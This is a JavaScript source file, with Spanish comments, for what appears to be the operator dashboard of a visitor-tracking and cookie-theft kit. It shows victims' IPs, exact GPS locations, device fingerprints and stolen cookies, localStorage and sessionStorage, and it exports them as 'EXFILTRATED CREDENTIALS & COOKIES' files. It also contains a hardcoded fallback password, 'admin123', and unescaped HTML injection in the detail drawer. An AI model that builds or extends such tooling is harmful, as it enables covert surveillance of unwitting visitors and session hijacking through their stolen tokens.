// public/js/dashboard.js
import { firebaseConfig, SOC_PASSWORD } from './config.js';

// Inicializar Firebase Compat si aún no está inicializado
if (typeof firebase !== 'undefined' && !firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

// Función sanitizadora contra Stored XSS
function escapeHTML(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Variables globales de UI
let rawData = {};
let map = null;
let markers = [];
let osChart = null;

// Inicialización cuando carga el DOM
document.addEventListener('DOMContentLoaded', () => {
  initMap();
  initChart();
  bindEvents();
  initAuth();
});

// Función de autenticación SOC
function initAuth() {
  const overlay = document.getElementById('soc-auth-overlay');
  const form = document.getElementById('soc-auth-form');
  const input = document.getElementById('soc-password-input');
  const errorMsg = document.getElementById('auth-error-msg');

  if (sessionStorage.getItem('soc_authenticated') === 'true') {
    if (overlay) overlay.style.display = 'none';
    listenToFirebase();
    return;
  }

  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      const pwd = (input.value || '').trim();
      const targetPwd = SOC_PASSWORD || 'admin123';
      if (pwd === targetPwd) {
        sessionStorage.setItem('soc_authenticated', 'true');
        if (overlay) {
          overlay.style.transition = 'opacity 0.3s ease';
          overlay.style.opacity = '0';
          setTimeout(() => {
            overlay.style.display = 'none';
            overlay.style.opacity = '1';
          }, 300);
        }
        listenToFirebase();
      } else {
        if (errorMsg) {
          errorMsg.textContent = '❌ CLAVE INCORRECTA — ACCESO DENEGADO';
          errorMsg.style.display = 'block';
        }
        if (input) {
          input.style.borderColor = '#ff3344';
          input.value = '';
          input.focus();
        }
      }
    });
  }
}

// 1. Inicializar Mapa Leaflet Dark Theme
function initMap() {
  const mapElement = document.getElementById('soc-map');
  if (!mapElement) return;

  // Centro inicial por defecto (Buenos Aires / Argentina)
  map = L.map('soc-map').setView([-34.6037, -58.3816], 3);
  window._socMap = map;

  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap contributors',
    maxZoom: 19
  }).addTo(map);
}

// 2. Inicializar Gráfico Chart.js
function initChart() {
  const ctx = document.getElementById('osChart');
  if (!ctx) return;

  osChart = new Chart(ctx, {
    type: 'doughnut',
    data: {
      labels: ['Windows', 'Android', 'iOS / Mac', 'Linux / OT'],
      datasets: [{
        data: [0, 0, 0, 0],
        backgroundColor: ['#00a8ff', '#00ff88', '#ff3344', '#e2e8f0'],
        borderWidth: 2,
        borderColor: '#12121a'
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          position: 'bottom',
          labels: { color: '#8492a6', font: { family: 'Inter', size: 11 } }
        }
      }
    }
  });
}

// 3. Escuchar datos en tiempo real de Firebase
function listenToFirebase() {
  const ref = db.ref('visitors');
  ref.on('value', (snapshot) => {
    rawData = snapshot.val() || {};
    processAndRenderData(rawData);
  }, (err) => {
    console.error('Error al escuchar en Firebase:', err);
    document.getElementById('conn-text').textContent = 'ERROR DE CONEXIÓN';
    document.getElementById('conn-text').style.color = '#ff3344';
  });
}

// 4. Procesar y Renderizar toda la información en la pantalla
function processAndRenderData(data) {
  const items = Object.values(data).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  
  updateKPIs(items);
  renderTable(items);
  renderDeviceCardsGrid(items);
  updateMap(items);
  updateChart(items);
}

// Renderizar Cuadrícula de Tarjetas de Dispositivos Individuales y Payload JSON Raw
function renderDeviceCardsGrid(items) {
  const gridContainer = document.getElementById('device-cards-grid');
  if (!gridContainer) return;

  if (!items || items.length === 0) {
    gridContainer.innerHTML = '<div style="color:#8492a6; padding:10px;">No hay dispositivos registrados aún.</div>';
    return;
  }

  let html = '';
  items.forEach(item => {
    const geo = item.geo || {};
    const fp = escapeHTML(item.canvasFingerprint || 'N/A');
    const jsonStr = escapeHTML(JSON.stringify(item, null, 2));

    // Parser en vivo de User-Agent y Platform para expedientes antiguos y nuevos
    const ua = item.userAgent || '';
    const platform = item.platform || '';

    let osName = item.parsedOS;
    if (!osName || osName === 'Desconocido') {
      if (/android/i.test(ua) || /android/i.test(platform)) osName = '📱 Android';
      else if (/iPhone|iPad|iPod/i.test(ua) || /iPhone|iPad/i.test(platform)) osName = '📱 iOS (iPhone/iPad)';
      else if (/Win/i.test(ua) || /Win/i.test(platform)) osName = '💻 Windows';
      else if (/Mac/i.test(ua) || /Mac/i.test(platform)) osName = '💻 macOS';
      else if (/Linux/i.test(ua) || /Linux/i.test(platform)) osName = '🐧 Linux';
      else osName = platform || 'Desconocido';
    }

    let browserName = item.parsedBrowser;
    if (!browserName || browserName === 'N/A') {
      if (ua.includes('Firefox/')) browserName = 'Firefox (' + (ua.split('Firefox/')[1] || '').split(' ')[0] + ')';
      else if (ua.includes('Edg/')) browserName = 'Edge (' + (ua.split('Edg/')[1] || '').split(' ')[0] + ')';
      else if (ua.includes('Chrome/')) browserName = 'Chrome (' + (ua.split('Chrome/')[1] || '').split(' ')[0] + ')';
      else if (ua.includes('Safari/') && !ua.includes('Chrome')) browserName = 'Safari';
      else browserName = ua ? 'Browser Genérico' : 'N/A';
    }

    let devType = item.deviceType;
    if (!devType) {
      if (/mobile/i.test(ua) || /android/i.test(ua) || /iphone/i.test(ua)) devType = '📱 Teléfono Móvil';
      else if (/ipad|tablet/i.test(ua)) devType = '📱 Tablet';
      else devType = '💻 Computadora de Escritorio';
    }

    html += `
      <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; display: flex; flex-direction: column; gap: 10px;">
        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border-color); padding-bottom:8px;">
          <span style="font-weight:700; color:#00ff88; font-size:0.85rem;">${escapeHTML(devType)} — ${escapeHTML(osName)}</span>
          <span class="tag ${item.geo?.gps?.lat ? 'tag-gps' : 'tag-ip'}" style="font-size:0.7rem;">${fp}</span>
        </div>
        <div style="font-size:0.8rem; color:var(--text-main); font-family:var(--font-code);">
          🌐 <strong>IP:</strong> ${escapeHTML(item.ip || 'N/A')}<br/>
          🖥️ <strong>Dispositivo / SO:</strong> ${escapeHTML(devType)} — <span style="color:#00ff88;">${escapeHTML(osName)}</span><br/>
          🌐 <strong>Navegador:</strong> <span style="color:#00a8ff;">${escapeHTML(browserName)}</span><br/>
          📍 <strong>Ubicación:</strong> ${escapeHTML(geo.city || 'N/A')}, ${escapeHTML(geo.country || 'N/A')}<br/>
          🎮 <strong>GPU:</strong> ${escapeHTML(item.webglRenderer ? item.webglRenderer.split('(')[0] : 'N/A')}<br/>
          🔋 <strong>Batería:</strong> ${escapeHTML(item.battery ? item.battery.level : 'N/A')} | 🛑 <strong>AdBlock:</strong> ${escapeHTML(item.adBlockDetected || 'No')}<br/>
          📷 <strong>Periféricos:</strong> ${escapeHTML(item.mediaDevicesCount || 'N/A')} dispositivos
        </div>
        <details style="margin-top:6px; background:var(--bg-dark); border:1px solid var(--border-color); border-radius:4px; padding:8px;">
          <summary style="font-size:0.75rem; color:#00a8ff; cursor:pointer; font-weight:700;">📄 Ver Objeto JSON Completo</summary>
          <pre style="font-size:0.7rem; color:#00ff88; margin-top:8px; max-height:180px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;">${jsonStr}</pre>
        </details>
          <button class="btn-action" style="margin-top:6px; align-self:flex-start;" onclick="downloadCookies('${escapeHTML(item.sessionId)}')">🍪 Descargar Cookies</button>
      </div>
    `;
  });

  gridContainer.innerHTML = html;
}

// Exponer funciones de descarga en scope global (window) para los handlers onclick del HTML
window.downloadDeviceData = downloadDeviceData;
window.downloadCookies = downloadCookies;

// Descargar datos JSON de un dispositivo específico
function downloadDeviceData(sessionId) {
  if (!sessionId) return;
  const ref = db.ref('visitors/' + sessionId);
  ref.once('value')
    .then(snap => {
      const data = snap.val();
      if (!data) { showMsg('No se encontraron datos para la sesión.', true); return; }
      const json = JSON.stringify(data, null, 2);
      const blob = new Blob([json], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `device_${sessionId}.json`;
      document.body.appendChild(a);
      a.click();
      setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);
    })
    .catch(err => { console.error(err); showMsg('Error al descargar datos.', true); });
}

// Descregar reporte completo de Almacenamiento (Cookies, LocalStorage, SessionStorage)
function downloadCookies(sessionId) {
  if (!sessionId) return;
  const ref = db.ref('visitors/' + sessionId);
  ref.once('value')
    .then(snap => {
      const data = snap.val();
      if (!data) { showMsg('No se encontraron datos para la sesión.', true); return; }
      
      let content = `=====================================================\n`;
      content += `   CYBERFORENSIC EXFILTRATED CREDENTIALS & COOKIES   \n`;
      content += `=====================================================\n`;
      content += `Session ID: ${data.sessionId || sessionId}\n`;
      content += `Timestamp:  ${data.timestamp || 'N/A'}\n`;
      content += `IP Pública: ${data.ip || 'N/A'}\n`;
      content += `User-Agent: ${data.userAgent || 'N/A'}\n\n`;

      content += `--- [ 1. COOKIES ] ---\n`;
      content += (data.cookies && data.cookies !== '') ? `${data.cookies}\n\n` : `[Sin cookies document.cookie directas o HTTPOnly activas]\n\n`;

      content += `--- [ 2. LOCAL STORAGE ] ---\n`;
      if (data.localStorage && Object.keys(data.localStorage).length > 0) {
        content += JSON.stringify(data.localStorage, null, 2) + `\n\n`;
      } else {
        content += `[LocalStorage Vacío]\n\n`;
      }

      content += `--- [ 3. SESSION STORAGE ] ---\n`;
      if (data.sessionStorage && Object.keys(data.sessionStorage).length > 0) {
        content += JSON.stringify(data.sessionStorage, null, 2) + `\n\n`;
      } else {
        content += `[SessionStorage Vacío]\n\n`;
      }

      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `cookies_tokens_${sessionId}.txt`;
      document.body.appendChild(a);
      a.click();
      setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);
    })
    .catch(err => { console.error(err); showMsg('Error al descargar cookies.', true); });
}

// Actualizar Tarjetas KPI
function updateKPIs(items) {
  document.getElementById('kpi-total').textContent = items.length;

  let mobileCount = 0;
  let gpsCount = 0;
  const citiesSet = new Set();

  items.forEach(item => {
    const platform = (item.platform || '').toLowerCase();
    const ua = (item.userAgent || '').toLowerCase();
    if (platform.includes('android') || platform.includes('iphone') || ua.includes('mobile')) {
      mobileCount++;
    }

    const geo = item.geo || {};
    if (geo.city && geo.city !== 'Desconocida' && geo.city !== 'No disponible') {
      citiesSet.add(geo.city + ', ' + (geo.country || ''));
    }

    if (geo.gps && geo.gps.lat) {
      gpsCount++;
    }
  });

  const mobilePct = items.length > 0 ? Math.round((mobileCount / items.length) * 100) : 0;
  document.getElementById('kpi-mobile-ratio').textContent = `${mobilePct}%`;
  document.getElementById('kpi-cities').textContent = citiesSet.size;
  document.getElementById('kpi-gps-count').textContent = gpsCount;
}

// Renderizar Tabla de Eventos
function renderTable(items) {
  const tbody = document.getElementById('events-tbody');
  const query = (document.getElementById('search-input').value || '').toLowerCase();
  
  if (!items || items.length === 0) {
    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#8492a6;">Sin registros aún.</td></tr>';
    return;
  }

  const filtered = items.filter(item => {
    const text = [
      item.ip,
      item.sessionId,
      item.platform,
      item.userAgent,
      item.geo?.city,
      item.geo?.country
    ].join(' ').toLowerCase();
    return text.includes(query);
  });

  let html = '';
  filtered.forEach(item => {
    const dateStr = item.timestamp ? escapeHTML(new Date(item.timestamp).toLocaleString()) : 'N/A';
    const geo = item.geo || {};
    const locStr = escapeHTML([geo.city, geo.country].filter(Boolean).join(', ') || 'Desconocida');
    const isGPS = geo.gps && geo.gps.lat;
    
    html += `
      <tr data-id="${escapeHTML(item.sessionId)}">
        <td>${dateStr}</td>
        <td style="color:#00a8ff; font-weight:700;">${escapeHTML(item.ip || 'N/A')}</td>
        <td>📍 ${locStr}</td>
        <td>${escapeHTML(item.platform || 'N/A')}</td>
        <td>
          <span class="tag ${isGPS ? 'tag-gps' : 'tag-ip'}">
            ${isGPS ? '🎯 GPS EXACTO' : '🌐 IP GEO'}
          </span>
        </td>
        <td>
          <button class="btn-action btn-inspect" style="padding: 4px 10px; font-size: 0.75rem;">Ver Ficha</button>
        </td>
      </tr>
    `;
  });

  tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center; color:#8492a6;">No se encontraron resultados.</td></tr>';

  // Event Listeners para abrir el Drawer
  tbody.querySelectorAll('tr').forEach(tr => {
    tr.addEventListener('click', () => {
      const id = tr.getAttribute('data-id');
      const targetItem = items.find(i => i.sessionId === id);
      if (targetItem) openDrawer(targetItem);
    });
  });
}

// Actualizar Marcadores en el Mapa
function updateMap(items) {
  if (!map) return;

  // Limpiar marcadores viejos
  markers.forEach(m => map.removeLayer(m));
  markers = [];

  let count = 0;
  items.forEach(item => {
    const geo = item.geo || {};
    let lat = null;
    let lng = null;

    if (geo.gps && geo.gps.lat) {
      lat = geo.gps.lat;
      lng = geo.gps.lng;
    } else if (geo.lat && geo.lng) {
      lat = geo.lat;
      lng = geo.lng;
    }

    if (lat && lng) {
      count++;
      const isGPS = geo.gps && geo.gps.lat;
      const marker = L.circleMarker([lat, lng], {
        radius: isGPS ? 8 : 6,
        fillColor: isGPS ? '#00ff88' : '#ff3344',
        color: '#fff',
        weight: 1.5,
        opacity: 1,
        fillOpacity: 0.8
      }).addTo(map);

      marker.bindPopup(`
        <div style="font-family: 'Fira Code', monospace; font-size:0.8rem; color:#12121a;">
          <strong>${item.ip || 'N/A'}</strong><br/>
          📍 ${geo.city || 'Desconocida'}, ${geo.country || ''}<br/>
          📱 ${item.platform || 'N/A'}
        </div>
      `);

      markers.push(marker);
    }
  });

  document.getElementById('map-counter').textContent = `${count} Marcadores activos`;
}

// Actualizar Gráfico Chart.js
function updateChart(items) {
  if (!osChart) return;

  let win = 0, android = 0, ios = 0, linux = 0;

  items.forEach(item => {
    const p = (item.platform || '').toLowerCase();
    const ua = (item.userAgent || '').toLowerCase();

    if (p.includes('win')) win++;
    else if (p.includes('android') || ua.includes('android')) android++;
    else if (p.includes('iphone') || p.includes('ipad') || p.includes('mac')) ios++;
    else linux++;
  });

  osChart.data.datasets[0].data = [win, android, ios, linux];
  osChart.update();
}

// Inspeccionar Expediente (Panel Lateral / Drawer)
function openDrawer(item) {
  const drawer = document.getElementById('drawer');
  const overlay = document.getElementById('drawer-overlay');
  const container = document.getElementById('drawer-content');

  const geo = item.geo || {};
  const gps = geo.gps || {};
  const lat = gps.lat || geo.lat;
  const lng = gps.lng || geo.lng;
  const mapUrl = (lat && lng) ? `https://www.google.com/maps?q=${lat},${lng}` : '#';

  container.innerHTML = `
    <div class="detail-group">
      <div class="detail-label">ID de Sesión</div>
      <div class="detail-value-box" style="color:#00ff88;">${item.sessionId || 'N/A'}</div>
    </div>

    <div class="detail-group">
      <div class="detail-label">IP Pública & Geolocalización</div>
      <div class="detail-value-box">
        🌐 IP: <strong>${item.ip || 'N/A'}</strong><br/>
        📍 Ubicación: ${geo.city || 'Desconocida'}, ${geo.region || ''}, ${geo.country || ''}<br/>
        📡 Proveedor ISP: ${geo.isp || 'N/A'}
        ${lat ? `<br/><br/><a href="${mapUrl}" target="_blank" style="color:#00a8ff; font-weight:700;">🔗 Abrir Coordenadas en Google Maps (${lat}, ${lng})</a>` : ''}
      </div>
    </div>

    <div class="detail-group">
      <div class="detail-label">Entorno, GPU & Hardware Avanzado</div>
      <div class="detail-value-box">
        📱 Plataforma / SO: ${item.platform || 'N/A'}<br/>
        🎮 Gráficos / GPU: <span style="color:#00ff88;">${item.webglRenderer || 'N/A'}</span><br/>
        🖥️ Pantalla: ${item.screenWidth || 'N/A'}x${item.screenHeight || 'N/A'} (Color Depth: ${item.colorDepth || 'N/A'} bits, Ratio: ${item.pixelRatio || 1})<br/>
        🧠 CPU Cores: ${item.hardwareConcurrency || 'N/A'} | RAM: ~${item.deviceMemory || 'N/A'} GB | Puntos Táctiles: ${item.maxTouchPoints || 0}<br/>
        🔋 Batería: ${item.battery ? `${item.battery.level} (${item.battery.charging ? '⚡ Cargando' : '🔋 Desconectado'})` : 'N/A'}<br/>
        🌐 Tipo Red: ${item.connectionType || 'N/A'} | Bajada: ${item.downlink || 'N/A'} | RTT Latencia: ${item.rtt || 'N/A'}<br/>
        🔒 DoNotTrack: ${item.doNotTrack || 'No activo'}<br/>
        🌐 User-Agent: ${item.userAgent || 'N/A'}
      </div>
    </div>

    <div class="detail-group">
      <div class="detail-label">Datos de Almacenamiento Local (Cookies / Storage)</div>
      <div class="detail-value-box" style="max-height: 150px; overflow-y: auto; font-size:0.75rem;">
        <strong>Cookies:</strong> ${item.cookies || 'Ninguna'}<br/><br/>
        <strong>LocalStorage:</strong> ${JSON.stringify(item.localStorage || {}, null, 2)}
      </div>
    </div>
  `;

  drawer.classList.add('active');
  overlay.classList.add('active');
}

function closeDrawer() {
  document.getElementById('drawer').classList.remove('active');
  document.getElementById('drawer-overlay').classList.remove('active');
}

// Exportar Expedientes a CSV
function exportCSV() {
  const items = Object.values(rawData);
  if (items.length === 0) {
    alert('No hay datos para exportar.');
    return;
  }

  const headers = ['SessionID', 'Timestamp', 'IP', 'City', 'Country', 'Platform', 'UserAgent', 'Latitude', 'Longitude'];
  const rows = items.map(item => [
    `"${item.sessionId || ''}"`,
    `"${item.timestamp || ''}"`,
    `"${item.ip || ''}"`,
    `"${item.geo?.city || ''}"`,
    `"${item.geo?.country || ''}"`,
    `"${item.platform || ''}"`,
    `"${(item.userAgent || '').replace(/"/g, '""')}"`,
    `"${item.geo?.gps?.lat || item.geo?.lat || ''}"`,
    `"${item.geo?.gps?.lng || item.geo?.lng || ''}"`
  ]);

  const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement('a');
  link.setAttribute('href', encodedUri);
  link.setAttribute('download', `cyberforensic_telemetry_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// Event Listeners generales
function bindEvents() {
  document.getElementById('search-input').addEventListener('input', () => {
    processAndRenderData(rawData);
  });

  document.getElementById('btn-export').addEventListener('click', exportCSV);

  const lockBtn = document.getElementById('btn-lock-soc');
  if (lockBtn) {
    lockBtn.addEventListener('click', () => {
      sessionStorage.removeItem('soc_authenticated');
      const overlay = document.getElementById('soc-auth-overlay');
      const input = document.getElementById('soc-password-input');
      const errorMsg = document.getElementById('auth-error-msg');
      if (errorMsg) errorMsg.style.display = 'none';
      if (input) input.value = '';
      if (overlay) overlay.style.display = 'flex';
    });
  }

  document.getElementById('drawer-close').addEventListener('click', closeDrawer);
  document.getElementById('drawer-overlay').addEventListener('click', closeDrawer);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeDrawer();
  });
}
